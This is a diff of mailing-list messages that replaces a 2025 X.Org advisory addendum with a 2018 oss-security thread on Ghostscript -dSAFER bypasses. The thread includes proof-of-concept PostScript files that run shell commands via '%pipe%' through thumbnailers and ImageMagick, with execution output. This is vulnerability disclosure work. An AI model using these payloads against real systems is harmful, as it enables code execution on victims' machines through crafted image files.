@@ -1,4 +1,9 @@
-Received: (qmail 28503 invoked by uid 550); 18 Jun 2025 16:08:26 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5626" "Wednesday" "22" "August" "2018" "21:24:36" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkL5Tus9-4PJOTPGNwg0BVCd+NkgC9B_HM9ev+UTAS=59Q@mail.gmail.com>" "163" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "8" "2018082304:24:36" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Aug 22  163/5626  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>" ("<CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>" "<CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>" "<alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>" "<CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com>" "<CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>" "<CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>" "<CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 30010 invoked by uid 550); 23 Aug 2018 04:24:59 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,89 +11,210 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 26402 invoked from network); 18 Jun 2025 16:05:24 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1750262715;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=qEjzi50ovXMs7RenjmLsOU721Q0pAvrNWzCy7y48xy0=;
-	b=TGiuEnSgtn8EXGZ4VUDYNFnlMK7eLrxDZkE9uWxcEVHXAfPgJdkz/3ZECx5ssmAMmZlMmv
-	rAMKna+O8sIR/1E9nCIY1NnfjU7DYBd1cSLov2WN+B78MIrJhGfxhVrZOOor/jfmJEWazQ
-	03MJbnNtLUkqsiIQ68T8qHqNPHofS+w=
-X-MC-Unique: qKC6tdaHPJu61ttAimi9Gg-1
-X-Mimecast-MFC-AGG-ID: qKC6tdaHPJu61ttAimi9Gg_1750262712
+Received: (qmail 29988 invoked from network); 23 Aug 2018 04:24:58 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20161025;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
+        bh=0FaymDHUFyxPpGiQxo7bT759F8vy1/7slPi45Qur33U=;
+        b=bYOXZRR13WIV0uwaqiWEfkBDxB+KOyNaVKj4pzpFlWZaKG4LwmNEFyIjX7rY39pEFp
+         T2sncoa4h7tLUad4OwnvmS6gYEThGdBIahtMv6FnpBvf1GUIxepaGA2WECKz2ZTzWHm+
+         6bmeGleYcTsBJbamSeSjnnifJnD8zJRORBMO95J9u/JmMdDtHNmvAVQxqeIXv9eO9ySj
+         u+SIDLJABfEk1/c9P/0U8ypFlWPkv8MgExEhoURKBRUYx0zVqhftG7oUuX2p5059QrNX
+         M2hQCIwvbp8E63lr354y8cl0LuIWZjuseJw3NPKe4940IyJrl01Trpj/BzvzgdZb+x1A
+         M9ug==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1750262712; x=1750867512;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=qEjzi50ovXMs7RenjmLsOU721Q0pAvrNWzCy7y48xy0=;
-        b=CvEfa/yP0+uMd3kgO4LzbzY6AmJMkHGIjvqtF4utDfbqnKJrVb4OWh+gqvK+FL/CLg
-         z9SApcomdDRZUlJSnt6OpnFgNQ3XIW5bXTrexKqTcSxXWGoUkqaDP+U1bNP6I+3KYSTj
-         P8b9haNbTqlV1WDMOfuvnA8t9SQ+WFCSJRl/XuBU5tQiLWa9a99r0tFke7axqK4Z+ffk
-         8zIBXX6vW5rgHkN60fwQT9qkwLAFwCvtpXC8cmGuJu2EEkXvU+w4WbV7mF4tvgx+p/cU
-         tI9LMfi/u79JXLKoXeyXf31/sBvDsGefJny8pvginVQuGXp3JDp5Ty+7YKxuw+lWiHFQ
-         gwzQ==
-X-Gm-Message-State: AOJu0YxmrsegqVQn5Ayo+4u3zP3yR3dM7+gzSU1/TZVh6eP/DJO3naPy
-	lU9CAE7gtMlrTA3ptPcj3E4gfTy4sWaLy+YHC62HPeVFBYzzdsNsd1SQByhRDEQEPTSRwpgWPPz
-	NuemOr/x9hXIwlPlOwwIjB4bK+tipHiRGaWAa3jTYSM04JGMJ2+u6XDrLBzI3NZ6Ioiqe8zvBKX
-	QooZh1hbs+mM2+krJsFIaT2BSNU9lfk9t9Z4pk7taFiJY72grIrTDI
-X-Gm-Gg: ASbGncsEBOEmMZWfgNTLOroCsD5uSi00z5ytsaDnXPyWhNu6hYEZ2tDQCK+tFsW9yXa
-	bwNZEVgAivvCR0X/NbpCC3SZAcdmBYHKOcgOEKHLr/LQO9Q+bil5Tq3jLn+AfFEyz+Dx0MYIyUr
-	W7B4U=
-X-Received: by 2002:a05:6870:c1cb:b0:2e8:f3b3:cdcf with SMTP id 586e51a60fabf-2eaf07af5d7mr10827499fac.4.1750262712161;
-        Wed, 18 Jun 2025 09:05:12 -0700 (PDT)
-X-Google-Smtp-Source: AGHT+IFEJahgrtXBSMvW+llX3LY4uLho0NOnPclGLmjudIenYrsffRN0UacDZybADwW2d7YuZ8KpaiYvitZUpWDeKvc=
-X-Received: by 2002:a05:6870:c1cb:b0:2e8:f3b3:cdcf with SMTP id
- 586e51a60fabf-2eaf07af5d7mr10827453fac.4.1750262711468; Wed, 18 Jun 2025
- 09:05:11 -0700 (PDT)
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to;
+        bh=0FaymDHUFyxPpGiQxo7bT759F8vy1/7slPi45Qur33U=;
+        b=hnrRVztlQdr2msvrjZPUo9M3p3CpvksqhwamKQ4dXqTIKDONnvv9Z2wwyjAzLgQ1oI
+         3JWUZT03GvCxiKuv3yr9y8qsdthJx5KoLyv9ESBo1S4KzQvQr0pDAaVt14ZKlUcsatbm
+         kGG45Ebw3tme70q1TVS4hFsT4eSXRZU7T9PvuDjOEVA2lXzXlSZxXSbqSLjv3WPlWDm1
+         zVFMOMfc70qLBva9O9oqWVUErVpCYNyPcsbLERLHvUDLWa5SmcFOVePggKgWEiNU7qXu
+         zt8Xq+sXuevAR9eIyoIV+6POzFVTQqnc3tLwpuoW6Y71WUXgUjqNdfr5AKq5q7YwVvYv
+         8YBw==
+X-Gm-Message-State: APzg51CgblOR06ZN7YI/ZAlD77kA7x6klMYp6jsjYr0yhhEbvMPjzJ3I
+	mTRwiNZSe/BqyfUbjCJhAk0H1G1EiMiWDCQtar8jDTHpF2c=
+X-Google-Smtp-Source: ANB0VdYw/kM8it43d9zLGuh7hvw/UCBiaAl8n+vt093jCMBFkRJjHRVgj3LUPRCqAK8XwbzOpmotiXVjRtC2dNsA+Nw=
+X-Received: by 2002:a37:1118:: with SMTP id b24-v6mr1054814qkh.253.1534998285913;
+ Wed, 22 Aug 2018 21:24:45 -0700 (PDT)
 MIME-Version: 1.0
-References: <3663e7ee-4599-4d11-ae62-900477cc48d9@redhat.com> <9896730d-7a8d-48a9-aea0-b6500ebaeff7@redhat.com>
-In-Reply-To: <9896730d-7a8d-48a9-aea0-b6500ebaeff7@redhat.com>
-From: Olivier Fourdan <ofourdan@redhat.com>
-Date: Wed, 18 Jun 2025 18:04:35 +0200
-X-Gm-Features: AX0GCFvLugAxh_hW2nCHNeaSsUjPESDohWF8u_938GBwkoe6hcJNzGANJ2Y_xWI
-Message-ID: <CAP=2yyTF2ZewE+QOdmwFL+oc-gmFrWF56DnRHPBS9r9E8ON7Zw@mail.gmail.com>
+References: <CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>
+ <CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>
+ <alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>
+ <CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com>
+ <CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>
+ <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com> <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
+In-Reply-To: <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
+Message-ID: <CAJ_zFkL5Tus9-4PJOTPGNwg0BVCd+NkgC9B_HM9ev+UTAS=59Q@mail.gmail.com>
+Content-Type: multipart/alternative; boundary="00000000000090bc2b057412a3e9"
+Date: Wed, 22 Aug 2018 21:24:36 -0700
+From: Tavis Ormandy <taviso@google.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
+ coders in policy.xml by default?
 To: oss-security@lists.openwall.com
-X-Mimecast-Spam-Score: 0
-X-Mimecast-MFC-PROC-ID: 4GFTDz1pZ-LIgewslEgUg_Pxwj8QVkBbv3wC1Re0SHE_1750262712
-X-Mimecast-Originator: redhat.com
+
+--00000000000090bc2b057412a3e9
 Content-Type: text/plain; charset="UTF-8"
-Subject: [oss-security] Fwd: X.Org Security Advisory: multiple security issues X.Org X server
- and Xwayland
 
-Addendum to yesterday's X.Org Security Advisory for CVE-2025-49176:
+I've verified that on centos7 at least, just opening nautilus on Downloads
+is enough to trigger code execution via evince-thumbnailer.
 
-On 17/06/2025 15:43, Olivier Fourdan wrote:
-> [...]
-> ======================================================================
+I just called it test.tiff and used <a download href=test.tiff> in Chrome,
+opening nautilus executed the command immediately.
+
+I think we should kill (or at least trim the mime types)
+in /usr/share/thumbnailers/evince.thumbnailer.
+
+Tavis.
+
+On Wed, Aug 22, 2018 at 5:35 PM Tavis Ormandy <taviso@google.com> wrote:
+
+> Thanks Amit, that's scary, it looks like they're working on it right now.
 >
-> 2) CVE-2025-49176: Integer overflow in Big Requests Extension
+> FWIW, I figured out how to reproduce the original bug here in
+> evince-thumbnailer:
 >
-> The Big Requests extension allows requests larger than the 16-bit length
-> limit.
+> $ cat test.jpeg
+> %!PS
+> a0
+> { null restore } stopped { pop } if
+> (ppmraw) selectdevice
+> legal
+> mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+> showpage
+> $ strace -q -feexecve evince-thumbnailer  test.jpeg foo.out
+> execve("/usr/bin/evince-thumbnailer", ["evince-thumbnailer", "test.jpeg",
+> "foo.out"], 0x7ffeed3010d0 /* 65 vars */) = 0
+> execve("/bin/sh", ["sh", "-c", "id"], 0x7ffcf3ea8d18 /* 65 vars */) = 0
 >
-> It uses integers for the request length and checks for the size not to
-> exceed the maxBigRequestSize limit, but does so after translating the
-> length to integer by multiplying the given size in bytes by 4.
+> Tavis.
 >
-> In doing so, it might overflow the integer size limit before actually
-> checking for the overflow, defeating the purpose of the test.
+> On Wed, Aug 22, 2018 at 12:30 PM AmitB <me@amitbl.com> wrote:
 >
-> Introduced in: X11R6.0
-> Fixed in: xorg-server-21.1.17 and xwayland-24.1.7
-> Fix: https://gitlab.freedesktop.org/xorg/xserver/-/commit/03731b32
-> Found by: This issue was discovered by Nils Emmerich and reported by
->            Julian Suleder via ERNW Vulnerability Disclosure.
+>> I also took a look a copule weeks ago at few of the patches for your
+>> previous bugs from 2 years ago, and found that one of them is incomplete
+>> and still allowing RCE (
+>> https://bugs.ghostscript.com/show_bug.cgi?id=697178)
+>>
+>> POC:
+>> ------------------
+>> $ cat poc.jpg
+>> %!PS
+>> << (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
+>> currentdevice null true mark /OutputICCProfile (tty)
+>> .putdeviceparams
+>> showpage
+>> $ identify poc.jpg
+>> uid=1000(amit) gid=1000(amit) groups=1000(amit)
+>>
+>> After reviewing all of the comments in the original bug report I saw that
+>> you actually mentioned this issue, but it was not taken under
+>> consideration/forgotten for some reason.
+>> So effectively a public RCE PoC has been avaliable for GhostScript for
+>> almost 2 years.
+>>
+>> I opened a report two weeks ago at bugs.ghostscript.com:
+>> 699623 Incomplete fix for #697178 Allowing -dSAFER bypass
+>>
+>> But I got no response from them until today.
+>> If you have others channels of contact with them please let them know
+>> about
+>> this one too.
+>>
+>> On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@google.com>
+>> wrote:
+>>
+>> > Thanks Alex.
+>> >
+>> > FWIW, not all of these are visible, but I've started filing bugs, I'll
+>> file
+>> > a few more today and then let the developers work through the most
+>> serious
+>> > ones.
+>> >
+>> > 699654 /invalidaccess checks stop working after a failed restore
+>> > 699655 missing type checking in setcolor
+>> > 699656 LockDistillerParams boolean missing type checks
+>> > 699659 missing type check in type checker (!)
+>> > 699657 .tempfile SAFER restrictions seem to be broken
+>> > 699658 Bypassing PermitFileReading by handling undefinedfilename error
+>> > 699660 shading_param incomplete type checking
+>> > 699661 pdf14 garbage collection memory corruption
+>> > 699662 calling .bindnow causes sideeffects
+>> > 699663 .setdistillerkeys memory corruption
+>> > 699664 corrupt device object after error in job
+>> >
+>> > I'm working on getting reproducers working for the developers for all
+>> bugs.
+>> >
+>> > On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@gmail.com>
+>> wrote:
+>> >
+>> > > A small note. Both ImageMagick and GraphicsMagick process various file
+>> > > formats that can nest a different image file inside of them. These are
+>> > very
+>> > > frequently implemented with a call to ReadImage(), with no checking
+>> that
+>> > > it's the expected file format. (As a result, the fuzzer finds various
+>> > > impressive chains, with sometimes 3 different image formats nested
+>> inside
+>> > > of each other).
+>> > >
+>> > > The conclusion of this is that people _must not_ attempt to do their
+>> own
+>> > > format detection and then pass the data to IM/GM, because this can be
+>> > > bypassed with nested formats. It's imperative that GS truly be
+>> disabled
+>> > > with either policy.xml or by uninstall GS.
+>> > >
+>> > > Alex
+>> > >
+>> > > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
+>> > > bfriesen@simple.dallas.tx.us> wrote:
+>> > >
+>> > > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
+>> > > > >
+>> > > > > I think those thumbnails should be disabled, but you've probably
+>> > > noticed
+>> > > > I
+>> > > > > think everything related to untrusted ghostscript should be
+>> disabled
+>> > > :-)
+>> > > >
+>> > > > I have posted to the GraphicsMagick Announcements mailing list
+>> > > > regarding your findings (with a link to this list) and suggested
+>> that
+>> > > > a fool-proof solution is that Ghostscript should be uninstalled.
+>> > > >
+>> > > > Uninstalling Ghostscript entirely might cause software using libgs
+>> to
+>> > > > not execute at all unless a stub library is put in its place.
+>> > > >
+>> > > > Dependencies on Ghostscript are much larger than one would initially
+>> > > > think due to Postscript being the traditional output from Unix
+>> > > > software for "printing" and thus it is used as an intermediate
+>> format
+>> > > > in order to convert between formats.  EPS content is also embedded
+>> in
+>> > > > some other formats.
+>> > > >
+>> > > > Bob
+>> > > > --
+>> > > > Bob Friesenhahn
+>> > > > bfriesen@simple.dallas.tx.us,
+>> > > http://www.simplesystems.org/users/bfriesen/
+>> > > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+>> > > >
+>> > >
+>> > >
+>> > > --
+>> > > All that is necessary for evil to succeed is for good people to do
+>> > nothing.
+>> > >
+>> >
+>>
+>
 
-There is another case where the BigRequest length can cause an overflow,
-so that requires an additional fix:
-
-Fix: https://gitlab.freedesktop.org/xorg/xserver/-/commit/4fc4d76b
-
-Thanks to Peter Harris for pointing this out.
-
-A fix will be issued in xorg-server-21.1.18 and xwayland-24.1.8 shortly.
-
+--00000000000090bc2b057412a3e9--
